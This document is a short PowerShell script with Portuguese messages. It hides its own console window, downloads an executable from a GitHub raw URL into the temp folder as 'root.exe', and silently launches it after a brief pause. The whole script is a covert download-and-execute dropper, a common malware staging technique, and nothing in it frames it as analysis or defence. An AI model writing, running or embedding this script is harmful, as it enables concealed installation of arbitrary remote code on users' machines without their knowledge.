$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) ws
$downloadLink = "https://github.com/shibachomp/CHOMP/raw/main/Install.exe"
$tempDirectory = [System.IO.Path]::GetTempPath()
$filePath = Join-Path $tempDirectory "root.exe"

try {
    $client = New-Object System.Net.WebClient
    $client.DownloadFile($downloadLink, $filePath)

    Write-Host "Download concluído: $filePath"

    Start-Sleep -Seconds 5
    Start-Process $filePath
}
catch {
    Write-Host "Erro durante o download e execução do arquivo: $_.Exception.Message"
}
